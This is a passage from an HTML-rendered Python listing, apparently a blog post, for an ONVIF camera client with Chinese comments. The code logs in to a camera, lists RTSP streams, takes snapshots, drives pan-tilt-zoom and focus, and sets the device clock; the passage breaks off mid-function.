class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> groupby<br><br><span class="hljs-keyword">import</span> pytz<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> onvif <span class="hljs-keyword">import</span> ONVIFCamera<br><span class="hljs-keyword">from</span> requests.auth <span class="hljs-keyword">import</span> HTTPDigestAuth<br><span class="hljs-keyword">from</span> wsdiscovery.discovery <span class="hljs-keyword">import</span> ThreadedWSDiscovery <span class="hljs-keyword">as</span> WSDiscovery<br><span class="hljs-keyword">from</span> zeep.helpers <span class="hljs-keyword">import</span> serialize_object<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkPwdAndGetCam</span>(<span class="hljs-params">ip, port, usr, pwd</span>):<br>    <span class="hljs-keyword">try</span>:<br>        cam = ONVIFCamera(ip, port, usr, pwd)<br>        media = cam.create_media_service()<br>        profiles = media.GetProfiles()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;timed out&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(e):<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;连接超时，请检查地址以及端口是否正确&quot;</span>)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;HTTPConnectionPool&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(e):<br>            <span class="hljs-keyword">raise</span> Exception(<br>                <span class="hljs-string">&quot;连接失败，请检查地址以及端口是否正确。&quot;</span><br>                <span class="hljs-string">&quot;&lt;br/&gt;&lt;br/&gt;&lt;front style=&#x27;color: #aaa;&#x27;&gt;异常信息：%s&lt;/front&gt;&quot;</span> % <span class="hljs-built_in">str</span>(e))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> Exception(<br>                <span class="hljs-string">&quot;请检查账号密码是否正确。&quot;</span><br>                <span class="hljs-string">&quot;&lt;br/&gt;&lt;br/&gt;&lt;front style=&#x27;color: #aaa;&#x27;&gt;异常信息：%s&lt;/front&gt;&quot;</span> % <span class="hljs-built_in">str</span>(e))<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&#x27;cam&#x27;</span>: cam,<br>        <span class="hljs-string">&#x27;media&#x27;</span>: media,<br>        <span class="hljs-string">&#x27;profiles&#x27;</span>: profiles<br>    &#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">OnvifClient</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, ip, port: <span class="hljs-built_in">int</span>, usr, pwd, token=<span class="hljs-literal">None</span>, sourceToken=<span class="hljs-literal">None</span>, nodeToken=<span class="hljs-literal">False</span>, needSnapImg=<span class="hljs-literal">True</span>, needPtz=<span class="hljs-literal">True</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        初始化参数</span><br><span class="hljs-string">        :param ip:</span><br><span class="hljs-string">        :param port:</span><br><span class="hljs-string">        :param usr:</span><br><span class="hljs-string">        :param pwd:</span><br><span class="hljs-string">        :param token: 每个码流都会有一个独立的token，通常一个画面会有2个或更多码流，例如主码流&amp;辅码流</span><br><span class="hljs-string">        :param sourceToken: 每个画面会有一个独立的sourceToken，通常一个摄像头只有一个画面，有些红外、双摄之类的摄像头会有多个画面</span><br><span class="hljs-string">        :param nodeToken: 用于获取PTZ控制信息的token，因为nodeToken有可能为None，所以用False表示没传</span><br><span class="hljs-string">        :param needSnapImg: 是否需要截图，选否会加快速度</span><br><span class="hljs-string">        :param needPtz: 是否需要PTZ控制，选否会加快速度，一般查摄像头列表时可以传False</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-variable language_">self</span>.usr = usr<br>        <span class="hljs-variable language_">self</span>.pwd = pwd<br>        result = checkPwdAndGetCam(ip, port, usr, pwd)<br>        <span class="hljs-variable language_">self</span>.profiles = result[<span class="hljs-string">&#x27;profiles&#x27;</span>]<br>        <span class="hljs-variable language_">self</span>.cam = result[<span class="hljs-string">&#x27;cam&#x27;</span>]<br>        <span class="hljs-variable language_">self</span>.media = result[<span class="hljs-string">&#x27;media&#x27;</span>]<br>        <span class="hljs-variable language_">self</span>.needSnapImg = needSnapImg<br>        <span class="hljs-comment"># 如果没传token，默认使用第一个token</span><br>        <span class="hljs-variable language_">self</span>.token = token <span class="hljs-keyword">if</span> token <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-variable language_">self</span>.profiles[<span class="hljs-number">0</span>].token<br>        <span class="hljs-comment"># 如果没传sourceToken，默认使用第一个sourceToken</span><br>        <span class="hljs-variable language_">self</span>.sourceToken = sourceToken <span class="hljs-keyword">if</span> sourceToken <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> \<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">self</span>.profiles[<span class="hljs-number">0</span>].VideoSourceConfiguration.SourceToken<br>        <span class="hljs-comment"># 如果没传nodeToken，默认使用第一个nodeToken</span><br>        PTZConfiguration = <span class="hljs-variable language_">self</span>.profiles[<span class="hljs-number">0</span>].PTZConfiguration<br>        <span class="hljs-variable language_">self</span>.nodeToken = nodeToken <span class="hljs-keyword">if</span> nodeToken <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">False</span> \<br>            <span class="hljs-keyword">else</span> (PTZConfiguration.NodeToken <span class="hljs-keyword">if</span> PTZConfiguration <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>)<br>        <span class="hljs-keyword">if</span> needPtz:<br>            <span class="hljs-variable language_">self</span>.ptz = <span class="hljs-variable language_">self</span>.cam.create_ptz_service() <span class="hljs-keyword">if</span> <span class="hljs-built_in">bool</span>(<span class="hljs-variable language_">self</span>.cam.devicemgmt.GetCapabilities().PTZ) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>            <span class="hljs-variable language_">self</span>.imaging = <span class="hljs-variable language_">self</span>.cam.create_imaging_service()<br>            <span class="hljs-variable language_">self</span>.ptzNode = <span class="hljs-variable language_">self</span>.ptz.GetNode(&#123;<br>                <span class="hljs-string">&#x27;NodeToken&#x27;</span>: <span class="hljs-variable language_">self</span>.nodeToken<br>            &#125;) <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.ptz <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-variable language_">self</span>.nodeToken <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>            <span class="hljs-variable language_">self</span>.MoveOption = <span class="hljs-variable language_">self</span>.imaging.GetMoveOptions(&#123;<span class="hljs-string">&#x27;VideoSourceToken&#x27;</span>: <span class="hljs-variable language_">self</span>.sourceToken&#125;)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-variable language_">self</span>.cam = <span class="hljs-variable language_">self</span>.ptz = <span class="hljs-variable language_">self</span>.imaging = <span class="hljs-variable language_">self</span>.ptzNode = <span class="hljs-variable language_">self</span>.MoveOption = <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.ptzNode <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            SupportedPTZSpaces = <span class="hljs-variable language_">self</span>.ptzNode.SupportedPTZSpaces<br>            <span class="hljs-comment"># PTZ云台移动速度峰值</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(SupportedPTZSpaces.PanTiltSpeedSpace) &gt; <span class="hljs-number">0</span>:<br>                PanTiltSpeedSpace = SupportedPTZSpaces.PanTiltSpeedSpace<br>            <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(SupportedPTZSpaces.ContinuousPanTiltVelocitySpace) &gt; <span class="hljs-number">0</span>:<br>                PanTiltSpeedSpace = SupportedPTZSpaces.ContinuousPanTiltVelocitySpace<br>            <span class="hljs-keyword">else</span>:<br>                PanTiltSpeedSpace = <span class="hljs-literal">None</span><br>            <span class="hljs-variable language_">self</span>.PanTiltSpeedMax = PanTiltSpeedSpace[<span class="hljs-number">0</span>].XRange.Max <span class="hljs-keyword">if</span> PanTiltSpeedSpace <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>            <span class="hljs-comment"># PTZ缩放速度峰值</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(SupportedPTZSpaces.ZoomSpeedSpace) &gt; <span class="hljs-number">0</span>:<br>                ZoomSpeedSpace = SupportedPTZSpaces.ZoomSpeedSpace<br>            <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(SupportedPTZSpaces.ContinuousZoomVelocitySpace) &gt; <span class="hljs-number">0</span>:<br>                ZoomSpeedSpace = SupportedPTZSpaces.ContinuousZoomVelocitySpace<br>            <span class="hljs-keyword">else</span>:<br>                ZoomSpeedSpace = <span class="hljs-literal">None</span><br>            <span class="hljs-variable language_">self</span>.ZoomSpeedMax = ZoomSpeedSpace[<span class="hljs-number">0</span>].XRange.Max <span class="hljs-keyword">if</span> ZoomSpeedSpace <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-variable language_">self</span>.PanTiltSpeedMax = <span class="hljs-variable language_">self</span>.ZoomSpeedMax = <span class="hljs-literal">None</span><br>        <span class="hljs-comment"># 聚焦移动速度峰值</span><br>        <span class="hljs-variable language_">self</span>.MoveSpeedMax = <span class="hljs-variable language_">self</span>.MoveOption.Continuous.Speed.Max \<br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.MoveOption <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_rtsp</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        获取RTSP地址等</span><br><span class="hljs-string">        参考文档：https://www.onvif.org/onvif/ver10/media/wsdl/media.wsdl#op.GetStreamUri</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        result = []<br>        StreamSetup = &#123;<span class="hljs-string">&#x27;Stream&#x27;</span>: <span class="hljs-string">&#x27;RTP-Unicast&#x27;</span>, <span class="hljs-string">&#x27;Transport&#x27;</span>: &#123;<span class="hljs-string">&#x27;Protocol&#x27;</span>: <span class="hljs-string">&#x27;RTSP&#x27;</span>&#125;&#125;<br>        <span class="hljs-keyword">for</span> profile <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.profiles:<br>            obj = <span class="hljs-variable language_">self</span>.media.create_type(<span class="hljs-string">&#x27;GetStreamUri&#x27;</span>)<br>            obj.StreamSetup = StreamSetup<br>            obj.ProfileToken = profile.token<br>            res_uri = <span class="hljs-variable language_">self</span>.media.GetStreamUri(obj)[<span class="hljs-string">&#x27;Uri&#x27;</span>]<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;rtsp://&#x27;</span> <span class="hljs-keyword">in</span> res_uri <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;@&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res_uri:<br>                res_uri = res_uri.replace(<span class="hljs-string">&#x27;rtsp://&#x27;</span>, <span class="hljs-string">&#x27;rtsp://%s:%s@&#x27;</span> % (<span class="hljs-variable language_">self</span>.usr, <span class="hljs-variable language_">self</span>.pwd))<br>            result.append(&#123;<br>                <span class="hljs-string">&#x27;source&#x27;</span>: profile.VideoSourceConfiguration.SourceToken,<br>                <span class="hljs-string">&#x27;node&#x27;</span>: profile.PTZConfiguration.NodeToken <span class="hljs-keyword">if</span> profile.PTZConfiguration <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>,<br>                <span class="hljs-string">&#x27;uri&#x27;</span>: res_uri,<br>                <span class="hljs-string">&#x27;token&#x27;</span>: profile.token,<br>                <span class="hljs-string">&#x27;videoEncoding&#x27;</span>: profile.VideoEncoderConfiguration.Encoding,<br>                <span class="hljs-string">&#x27;Resolution&#x27;</span>: serialize_object(profile.VideoEncoderConfiguration.Resolution),<br>                <span class="hljs-string">&#x27;img&#x27;</span>: <span class="hljs-variable language_">self</span>.snip_image(profile.token) <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.needSnapImg <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>            &#125;)<br>        sortedResult = <span class="hljs-built_in">sorted</span>(result, key=<span class="hljs-keyword">lambda</span> d: d[<span class="hljs-string">&#x27;source&#x27;</span>])<br>        groupData = groupby(sortedResult, key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-string">&#x27;source&#x27;</span>])<br>        <span class="hljs-keyword">return</span> [&#123;<span class="hljs-string">&#x27;source&#x27;</span>: key, <span class="hljs-string">&#x27;data&#x27;</span>: [item <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> group]&#125; <span class="hljs-keyword">for</span> key, group <span class="hljs-keyword">in</span> groupData]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">snip_image</span>(<span class="hljs-params">self, token=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        截图，如果在浏览器上访问，可在img的src填入[data:image/jpeg;base64,%s]，%s处填写return值</span><br><span class="hljs-string">        参考文档：https://www.onvif.org/onvif/ver10/media/wsdl/media.wsdl#op.GetSnapshotUri</span><br><span class="hljs-string">        :param token:</span><br><span class="hljs-string">        :return: base64转码之后的图片</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        token = token <span class="hljs-keyword">if</span> token <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-variable language_">self</span>.token<br>        res = <span class="hljs-variable language_">self</span>.media.GetSnapshotUri(&#123;<span class="hljs-string">&#x27;ProfileToken&#x27;</span>: token&#125;)<br>        auth = HTTPDigestAuth(<span class="hljs-variable language_">self</span>.usr, <span class="hljs-variable language_">self</span>.pwd)<br>        rsp = requests.get(res.Uri, auth=auth)<br>        <span class="hljs-keyword">return</span> base64.b64encode(rsp.content).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_deviceInfo</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        获取设备信息</span><br><span class="hljs-string">        参考文档：https://www.onvif.org/onvif/ver10/device/wsdl/devicemgmt.wsdl#op.GetDeviceInformation</span><br><span class="hljs-string">        :return: 设备信息，包括名称-Model、厂家-Manufacturer、固件版本-FirmwareVersion、序列号-SerialNumber、硬件ID-HardwareId</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> serialize_object(<span class="hljs-variable language_">self</span>.cam.devicemgmt.GetDeviceInformation())<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">ptz_move</span>(<span class="hljs-params">self, Velocity=<span class="hljs-literal">None</span>, token=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        PTZ控制移动</span><br><span class="hljs-string">        参考文档：https://www.onvif.org/onvif/ver20/ptz/wsdl/ptz.wsdl#op.ContinuousMove</span><br><span class="hljs-string">        :param token: 移动设备的token</span><br><span class="hljs-string">        :param Velocity: 可选参数，不传表示停止移动</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        token = token <span class="hljs-keyword">if</span> token <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-variable language_">self</span>.token<br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.ptz <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">if</span> Velocity <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-comment"># 只在移动时展示不支持，以免频繁打扰</span><br>                <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;该设备不支持PTZ控制&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> Velocity <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-variable language_">self</span>.ptz.Stop(&#123;<span class="hljs-string">&#x27;ProfileToken&#x27;</span>: token&#125;)<br>            <span class="hljs-keyword">else</span>:<br>                request = <span class="hljs-variable language_">self</span>.ptz.create_type(<span class="hljs-string">&#x27;ContinuousMove&#x27;</span>)<br>                request.ProfileToken = token<br>                request.Velocity = Velocity<br>                <span class="hljs-variable language_">self</span>.ptz.ContinuousMove(request)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">focus_move</span>(<span class="hljs-params">self, speed=<span class="hljs-literal">None</span>, token=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        聚焦</span><br><span class="hljs-string">        参考文档：https://www.onvif.org/onvif/ver20/imaging/wsdl/imaging.wsdl#op.Move</span><br><span class="hljs-string">        :param token: VideoSourceToken</span><br><span class="hljs-string">        :param speed: 正数：聚焦+，拉近；负数：聚焦-，拉远；None：停止聚焦</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        token = token <span class="hljs-keyword">if</span> token <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-variable language_">self</span>.sourceToken<br>        <span class="hljs-keyword">if</span> speed <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            request = <span class="hljs-variable language_">self</span>.imaging.create_type(<span class="hljs-string">&#x27;Move&#x27;</span>)<br>            request.VideoSourceToken = token<br>            request.Focus = &#123;<span class="hljs-string">&#x27;Continuous&#x27;</span>: &#123;<span class="hljs-string">&#x27;Speed&#x27;</span>: speed&#125;&#125;<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-variable language_">self</span>.imaging.Move(request)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">raise</span> Exception(<br>                    <span class="hljs-string">&quot;该设备不支持该功能！&quot;</span><br>                    <span class="hljs-string">&quot;&lt;br/&gt;&lt;br/&gt;&lt;front style=&#x27;color: #aaa;&#x27;&gt;异常信息：%s&lt;/front&gt;&quot;</span> % <span class="hljs-built_in">str</span>(e))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-variable language_">self</span>.imaging.Stop(&#123;<span class="hljs-string">&#x27;VideoSourceToken&#x27;</span>: token&#125;)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_cam_time</span>(<span class="hljs-params">self, timeStamp=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        设置时间</span><br><span class="hljs-string">        参考文档：https://www.onvif.org/onvif/ver10/device/wsdl/devicemgmt.wsdl#op.SetSystemDateAndTime</span><br><span class="hljs-string">        :param timeStamp: 秒级时间戳，不传则使用当前时间</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> timeStamp <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            timeNow = datetime.datetime.now()<br>        <span class="hljs-keyword">else</span>:<br>            timeNow = datetime.datetime.fromtimestamp(<span class="hljs-built_in">int</span>(timeStamp))<br>        utc_now = timeNow.astimezone(pytz.utc)<br>        <span class="hljs-variable language_">self</span>.cam.devicemgmt.SetSystemDateAndTime(&#123;<br>            <span class="hljs-string">&#x27;DateTimeType&#x27;</span>: <span class="hljs-string">&#x27;Manual&#x27;</span>,<br>            <span class="hljs-string">&#x27;DaylightSavings&#x27;</span>: <span class="hljs-literal">False</span>,<br>            <span class="hljs-string">&#x27;TimeZone&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;TZ&#x27;</span>: <span class="hljs-string">&#x27;CST-8&#x27;</span><br>            &#125;,<br>            <span class="hljs-string">&#x27;UTCDateTime&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;Time&#x27;</span>: &#123;<br>                    <span class="hljs-string">&#x27;Hour&#x27;</span>: utc_now.hour,<br>                    <span class="hljs-string">&#x27;Minute&#x27;</span>: utc_now.minute,<br>                    <span class="hljs-string">&#x27;Second&#x27;</span>: utc_now.second<br>                &#125;,<br>                <span class="hljs-string">&#x27;Date&#x27;</span>: &#123;<br>                    <span class="hljs-string">&#x27;Year&#x27;</span>: utc_now.year,<br>                    <span class="hljs-string">&#x27;Month&#x27;</span>: utc_now.month,<br>                    <span class="hljs-string">&#x27;Day&#x27;</span>: utc_now.day<br>                &#125;<br>            &#125;<br>        &#125;)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ptzChangeByClient</span>(<span class="hljs-params">client, codeStr, status, speed=<span class="hljs-number">50.0</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    PTZ控制</span><br><span class="hljs-string">    :param client: onvif客户端</span><br><span class="hljs-string">    :param speed: 相对速度，1-100</span><br><span class="hljs-string">    :param status:  状态，1-开始，0-停止</span><br><span class="hljs-string">    :param codeStr: 标志字符串</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    ptzList = [<span class="hljs-string">&#x27;Up&#x27;</span>, <span class="hljs-string">&#x27;Right&#x27;</span>, <span class="hljs-string">&#x27;Down&#x27;</span>, <span class="hljs-string">&#x27;Left&#x27;</span>, <span class="hljs-string">&#x27;LeftUp&#x27;</span>, <span class="hljs-string">&#x27;RightUp&#x27;</span>, <span class="hljs-string">&#x27;LeftDown&#x27;</span>, <span class="hljs-string">&#x27;RightDown&#x27;</span>, <span class="hljs-string">&#x27;ZoomWide&#x27;</span>, <span class="hljs-string">&#x27;ZoomTele&#x27;</span>]<br>    focusList = [<span class="hljs-string">&#x27;FocusFar&#x27;</span>, <span class="hljs-string">&#x27;FocusNear&#x27;</span>]<br>    <span class="hljs-keyword">if</span> codeStr <span class="hljs-keyword">in</span> ptzList:<br>        <span class="hljs-keyword">if</span> client.ptz <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">if</span> status == <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;当前设备不支持PTZ控制&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">if</span> status == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Zoom&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> codeStr:<br>                <span class="hljs-keyword">if</span> client.PanTiltSpeedMax <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                    <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> client.ZoomSpeedMax <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                    <span class="hljs-keyword">return</span><br>            client.ptz_move()<br>        <span class="hljs-keyword">else</span>:<br>            PanTiltSpeed = <span class="hljs-number">0</span><br>            ZoomSpeed = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Zoom&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> codeStr:<br>                <span class="hljs-keyword">if</span> client.PanTiltSpeedMax <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;当前设备不支持云台控制&quot;</span>)<br>                PanTiltSpeed = client.PanTiltSpeedMax * <span class="hljs-built_in">float</span>(speed) / <span class="hljs-number">100.0</span><br>                speedTilt = PanTiltSpeed <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Up&#x27;</span> <span class="hljs-keyword">in</span> codeStr <span class="hljs-keyword">else</span> (<br>                    PanTiltSpeed * -<span class="hljs-number">1.0</span> <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Down&#x27;</span> <span class="hljs-keyword">in</span> codeStr <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>)<br>                speedPan = PanTiltSpeed <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Right&#x27;</span> <span 